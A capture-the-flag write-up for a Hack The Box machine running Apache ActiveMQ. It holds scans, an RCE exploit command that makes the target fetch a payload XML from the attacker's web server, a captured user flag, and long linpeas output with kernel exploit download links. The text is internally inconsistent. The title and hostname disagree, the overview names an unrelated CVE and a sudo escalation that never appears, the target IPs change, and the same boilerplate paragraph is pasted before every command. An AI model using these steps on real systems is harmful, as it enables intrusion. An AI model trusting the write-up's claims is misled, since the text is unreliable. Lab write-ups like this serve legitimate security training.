---
title: "HackTheBox - Bloker (Linux)"
date: 2026-02-27
description: "Hack The Box Bloker Linux writeup with service enumeration, foothold strategy, and privilege escalation path."
categories: [HackTheBox, Linux]
tags: [php, privilege-escalation, rce, suid]
mermaid: true
---

## Overview

| Field                     | Value |
|---------------------------|-------|
| OS                        | Linux |
| Difficulty                | Not specified |
| Attack Surface            | 22/tcp (ssh), 80/tcp (http), 1883/tcp (mqtt), 5672/tcp (amqp?), 8161/tcp (http), 42243/tcp (tcpwrapped), 61613/tcp (stomp), 61614/tcp (http) |
| Primary Entry Vector      | Public exploit path involving CVE-2017-5618 |
| Privilege Escalation Path | Credentialed access -> sudo policy abuse -> elevated shell |

## Reconnaissance

Port scan results are shown below.
This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
✅[CPU:7][MEM:50][TUN0:10.10.14.147][/home/n0z0]
🐉 grc nmap -p- -sC -sV -T4 -A -Pn $ip
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-29 21:33 JST
Warning: 10.129.230.87 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.129.230.87
Host is up (0.26s latency).
Not shown: 65492 closed tcp ports (reset), 34 filtered tcp ports (no-response)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp    open  http       nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-title: Error 401 Unauthorized
1883/tcp  open  mqtt
|_mqtt-subscribe: Failed to receive control packet from server.
5672/tcp  open  amqp?
|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     AMQP
|     AMQP
|     amqp:decode-error
|_    7Connection from client using unsupported AMQP attempted
8161/tcp  open  http       Jetty 9.4.39.v20210325
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-title: Error 401 Unauthorized
|_http-server-header: Jetty(9.4.39.v20210325)
42243/tcp open  tcpwrapped
61613/tcp open  stomp      Apache ActiveMQ
| fingerprint-strings: 
|   HELP4STOMP: 
|     ERROR
|     content-type:text/plain
|     message:Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)
|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
|_    java.lang.Thread.run(Thread.java:750)
61614/tcp open  http       Jetty 9.4.39.v20210325
|_http-server-header: Jetty(9.4.39.v20210325)
|_http-title: Site doesn't have a title.
| http-methods: 
|_  Potentially risky methods: TRACE
61616/tcp open  apachemq   ActiveMQ OpenWire transport 5.15.15
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5672-TCP:V=7.95%I=7%D=4/29%Time=6810CBA4%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\
SF:xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01
SF:\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20cli
SF:ent\x20using\x20unsupported\x20AMQP\x20attempted")%r(HTTPOptions,89,"AM
SF:QP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1
SF:\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x0
SF:2\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client\x20using\x2
SF:0unsupported\x20AMQP\x20attempted")%r(RTSPRequest,89,"AMQP\x03\x01\0\0A
SF:MQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`
SF:\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:d
SF:ecode-error\xa17Connection\x20from\x20client\x20using\x20unsupported\x2
SF:0AMQP\x20attempted")%r(RPCCheck,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\
SF:0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x0
SF:2\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Co
SF:nnection\x20from\x20client\x20using\x20unsupported\x20AMQP\x20attempted
SF:")%r(DNSVersionBindReqTCP,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\
SF:x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\
SF:0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connecti
SF:on\x20from\x20client\x20using\x20unsupported\x20AMQP\x20attempted")%r(D
SF:NSStatusRequestTCP,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0
SF:\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x1
SF:8\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20f
SF:rom\x20client\x20using\x20unsupported\x20AMQP\x20attempted")%r(SSLSessi
SF:onReq,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0
SF:\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S
SF:\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client
SF:\x20using\x20unsupported\x20AMQP\x20attempted")%r(TerminalServerCookie,
SF:89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x
SF:04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\x
SF:c0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client\x20us
SF:ing\x20unsupported\x20AMQP\x20attempted");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port61613-TCP:V=7.95%I=7%D=4/29%Time=6810CB9F%P=x86_64-pc-linux-gnu%r(H
SF:ELP4STOMP,27F,"ERROR\ncontent-type:text/plain\nmessage:Unknown\x20STOMP
SF:\x20action:\x20HELP\n\norg\.apache\.activemq\.transport\.stomp\.Protoco
SF:lException:\x20Unknown\x20STOMP\x20action:\x20HELP\n\tat\x20org\.apache
SF:\.activemq\.transport\.stomp\.ProtocolConverter\.onStompCommand\(Protoc
SF:olConverter\.java:258\)\n\tat\x20org\.apache\.activemq\.transport\.stom
SF:p\.StompTransportFilter\.onCommand\(StompTransportFilter\.java:85\)\n\t
SF:at\x20org\.apache\.activemq\.transport\.TransportSupport\.doConsume\(Tr
SF:ansportSupport\.java:83\)\n\tat\x20org\.apache\.activemq\.transport\.tc
SF:p\.TcpTransport\.doRun\(TcpTransport\.java:233\)\n\tat\x20org\.apache\.
SF:activemq\.transport\.tcp\.TcpTransport\.run\(TcpTransport\.java:215\)\n
SF:\tat\x20java\.lang\.Thread\.run\(Thread\.java:750\)\n\0\n");
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT       ADDRESS
1   262.44 ms 10.10.14.1
2   262.52 ms 10.129.230.87

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1210.48 seconds

```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
✅[CPU:7][MEM:30][TUN0:10.10.14.147][.../seclists/Usernames/Names]
🐉 nikto -h http://$ip:8161 -Tuning 123456789 -C all
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.129.230.87
+ Target Hostname:    10.129.230.87
+ Target Port:        8161
+ Start Time:         2025-05-07 22:22:12 (GMT9)
---------------------------------------------------------------------------
+ Server: Jetty(9.4.39.v20210325)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ / - Requires Authentication for realm 'ActiveMQRealm'
+ /: Default account found for 'ActiveMQRealm' at (ID 'admin', PW 'admin'). Generic account discovered.. See: CWE-16
+ Root page / redirects to: http://10.129.230.87/index.html
+ Jetty/9.4.39.v20210325 appears to be outdated (current is at least 11.0.6). Jetty 10.0.6 AND 9.4.41.v20210516 are also currently supported.

```

![Screenshot showing exploitation evidence on bloker (step 1)](/assets/img/htb/bloker/Pasted%20image%2020250507224624.png)
*Caption: Screenshot captured during bloker at stage 1 of the attack chain.*

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
✅[CPU:0][MEM:38][TUN0:10.10.14.129][...k/htb/Broker/ActiveMQ-RCE]
🐉 go run main.go -i 10.129.224.175 -p 61616 -u http://10.10.14.129:8003/poc.xml  
     _        _   _           __  __  ___        ____   ____ _____ 
    / \   ___| |_(_)_   _____|  \/  |/ _ \      |  _ \ / ___| ____|
   / _ \ / __| __| \ \ / / _ \ |\/| | | | |_____| |_) | |   |  _|  
  / ___ \ (__| |_| |\ V /  __/ |  | | |_| |_____|  _ <| |___| |___ 
 /_/   \_\___|\__|_| \_/ \___|_|  |_|\__\_\     |_| \_\\____|_____|

[*] Target: 10.129.224.175:61616
[*] XML URL: http://10.10.14.129:8003/poc.xml

[*] Sending packet: 000000731f000000000000000000010100426f72672e737072696e676672616d65776f726b2e636f6e746578742e737570706f72742e436c61737350617468586d6c4170706c69636174696f6e436f6e74657874010020687474703a2f2f31302e31302e31342e3132393a383030332f706f632e786d6c

```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
✅[CPU:1][MEM:38][TUN0:10.10.14.129][...k/htb/Broker/ActiveMQ-RCE]
🐉 python3 -m http.server 8003

```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
ls
cat user.txt
```

```bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
activemq@broker:/home/activemq$ ls
ls
user.txt
activemq@broker:/home/activemq$ cat user.txt
cat user.txt
986ee8852655d4527878bfd2a782a972
activemq@broker:/home/activemq$ 

```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
./linpeas.sh
```

```bash
activemq@broker:/home/activemq$ ./linpeas.sh
./linpeas.sh

                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------|
    |         Learn Cloud Hacking       :     https://training.hacktricks.xyz          |
    |         Follow on Twitter         :     @hacktricks_live                        |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          LinPEAS-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting LinPEAS. Caching Writable Folders...
                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════
                               ╚═══════════════════╝
OS: Linux version 5.15.0-88-generic (buildd@lcy02-amd64-058) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #98-Ubuntu SMP Mon Oct 2 15:18:56 UTC 2023
User & Groups: uid=1000(activemq) gid=1000(activemq) groups=1000(activemq)
Hostname: broker

[+] /usr/bin/ping is available for network discovery (LinPEAS can discover hosts, learn more with -h)
[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (LinPEAS can discover hosts, scan ports, and forward ports. Learn more with -h)
[+] /usr/bin/nc is available for network discovery & port scanning (LinPEAS can discover hosts and scan ports, learn more with -h)

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE

                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════
                              ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits
Linux version 5.15.0-88-generic (buildd@lcy02-amd64-058) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #98-Ubuntu SMP Mon Oct 2 15:18:56 UTC 2023
Distributor ID:	Ubuntu
Description:	Ubuntu 22.04.3 LTS
Release:	22.04
Codename:	jammy

╔══════════╣ Sudo version
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version
Sudo version 1.9.9

╔══════════╣ PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

╔══════════╣ Date & uptime
Wed May 14 17:29:33 UTC 2025
 17:29:33 up 21 min,  0 users,  load average: 0.08, 0.03, 0.01

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices
/dev/sda2 / ext4 defaults 0 1
/dev/sda3 none swap sw 0 0
proc    /proc        proc        defaults,hidepid=2    0 0

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk
sda
sda1
sda2
sda3

╔══════════╣ Environment
╚ Any private information inside environment variables?
LESSOPEN=| /usr/bin/lesspipe %s
SHLVL=1
OLDPWD=/home
_=./linpeas.sh
LS_COLORS=
LESSCLOSE=/usr/bin/lesspipe %s %s
PWD=/home/activemq

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#dmesg-signature-verification-failed
dmesg Not Found

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: probable
   Tags: [ ubuntu=(22.04) ]{kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: less probable
   Tags: ubuntu=(20.04|21.04),debian=11
   Download URL: https://haxx.in/files/dirtypipez.c

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: less probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found
═╣ Execshield enabled? ............ Execshield Not Found
═╣ SELinux enabled? ............... sestatus Not Found
═╣ Seccomp enabled? ............... disabled
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (vmware)

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════
                                   ╚═══════════╝
╔══════════╣ Container related tools present (if any):
╔══════════╣ Container details
═╣ Is this a container? ........... No
═╣ Any running containers? ........ No

                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════
                                     ╚═══════╝
/usr/bin/curl
Learn and practice cloud hacking techniques in training.hacktricks.xyz

═╣ GCP Virtual Machine? ................. No
═╣ GCP Cloud Funtion? ................... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. No
═╣ AWS EC2 Beanstalk? ................... No
═╣ AWS Lambda? .......................... No
═╣ AWS Codebuild? ....................... No
═╣ DO Droplet? .......................... No
═╣ IBM Cloud VM? ........................ No
═╣ Azure VM or Az metadata? ............. No
═╣ Azure APP or IDENTITY_ENDPOINT? ...... No
═╣ Azure Automation Account? ............ No
═╣ Aliyun ECS? .......................... No
═╣ Tencent CVM? ......................... No

                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
                ╚════════════════════════════════════════════════╝
╔══════════╣ Running processes (cleaned)
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes
Looks like /etc/fstab has hidepid=2, so ps will not show processes of other users
activemq     943  0.9  5.9 3492000 239732 ?      Sl   17:08   0:12 /usr/bin/java -Xms64M -Xmx1G -Djava.util.logging.config.file=logging.properties -Djava.security.auth.login.config=/opt/apache-activemq-5.15.15//conf/login.config -Dcom.sun.management.jmxremote -Djava.awt.headless=true -Djava.io.tmpdir=/opt/apache-activemq-5.15.15//tmp -Dactivemq.classpath=/opt/apache-activemq-5.15.15//conf:/opt/apache-activemq-5.15.15//../lib/: -Dactivemq.home=/opt/apache-activemq-5.15.15/ -Dactivemq.base=/opt/apache-activemq-5.15.15/ -Dactivemq.conf=/opt/apache-activemq-5.15.15//conf -Dactivemq.data=/opt/apache-activemq-5.15.15//data -jar /opt/apache-activemq-5.15.15//bin/activemq.jar start
activemq    1061  0.0  0.0   2888   988 ?        S    17:23   0:00  _ /bin/sh
activemq    1074  0.0  0.0   2804  1064 ?        S    17:25   0:00      _ script /dev/null -c bash
activemq    1075  0.0  0.0   2888   936 pts/0    Ss   17:25   0:00          _ sh -c bash
activemq    1076  0.0  0.1   5680  4708 pts/0    S    17:25   0:00              _ bash
activemq    1115  0.1  0.0   3644  2600 pts/0    S+   17:29   0:00                  _ /bin/sh ./linpeas.sh
activemq    4316  0.0  0.0   3644   992 pts/0    S+   17:30   0:00                      _ /bin/sh ./linpeas.sh
activemq    4320  0.0  0.0   7060  1660 pts/0    R+   17:30   0:00                      |   _ ps fauxwww
activemq    4319  0.0  0.0   3644   992 pts/0    S+   17:30   0:00                      _ /bin/sh ./linpeas.sh

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found
lightdm Not Found
vsftpd Not Found
apache2 Not Found
sshd Not Found

╔══════════╣ Processes whose PPID belongs to a different user (not root)
╚ You will know if a user can somehow spawn processes as a different user
Proc 943 with ppid 1 is run by user activemq but the ppid user is 

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information
COMMAND    PID  TID TASKCMD       USER   FD      TYPE             DEVICE SIZE/OFF   NODE NAME

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

╔══════════╣ Cron jobs
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs
/usr/bin/crontab
incrontab Not Found
-rw-r--r-- 1 root root    1136 Mar 23  2022 /etc/crontab

/etc/cron.d:
total 20
drwxr-xr-x   2 root root 4096 Nov  7  2023 .
drwxr-xr-x 105 root root 4096 Nov  7  2023 ..
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder
-rw-r--r--   1 root root   91 Nov  7  2023 cleanup
-rw-r--r--   1 root root  201 Jan  8  2022 e2scrub_all

/etc/cron.daily:
total 32
drwxr-xr-x   2 root root 4096 Nov  7  2023 .
drwxr-xr-x 105 root root 4096 Nov  7  2023 ..
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder
-rwxr-xr-x   1 root root  376 Nov 11  2019 apport
-rwxr-xr-x   1 root root 1478 Apr  8  2022 apt-compat
-rwxr-xr-x   1 root root  123 Dec  5  2021 dpkg
-rwxr-xr-x   1 root root  377 May 25  2022 logrotate
-rwxr-xr-x   1 root root 1330 Mar 17  2022 man-db

/etc/cron.hourly:
total 12
drwxr-xr-x   2 root root 4096 Nov  6  2023 .
drwxr-xr-x 105 root root 4096 Nov  7  2023 ..
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x   2 root root 4096 Nov  6  2023 .
drwxr-xr-x 105 root root 4096 Nov  7  2023 ..
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder

/etc/cron.weekly:
total 16
drwxr-xr-x   2 root root 4096 Nov  6  2023 .
drwxr-xr-x 105 root root 4096 Nov  7  2023 ..
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder
-rwxr-xr-x   1 root root 1020 Mar 17  2022 man-db

SHELL=/bin/sh

17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ System timers
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers
NEXT                        LEFT          LAST                        PASSED               UNIT                           ACTIVATES
Wed 2025-05-14 18:06:31 UTC 36min left    Tue 2023-11-07 08:38:11 UTC 1 year 6 months ago  apt-daily-upgrade.timer        apt-daily-upgrade.service
Wed 2025-05-14 18:13:39 UTC 43min left    Mon 2023-11-06 01:00:18 UTC 1 year 6 months ago  fstrim.timer                   fstrim.service
Wed 2025-05-14 18:38:21 UTC 1h 7min left  Mon 2023-11-06 01:00:04 UTC 1 year 6 months ago  apt-daily.timer                apt-daily.service
Wed 2025-05-14 19:13:14 UTC 1h 42min left Mon 2023-11-06 01:34:17 UTC 1 year 6 months ago  motd-news.timer                motd-news.service
Thu 2025-05-15 00:00:00 UTC 6h left       n/a                         n/a                  dpkg-db-backup.timer           dpkg-db-backup.service
Thu 2025-05-15 00:00:00 UTC 6h left       Wed 2025-05-14 17:08:35 UTC 21min ago            logrotate.timer                logrotate.service
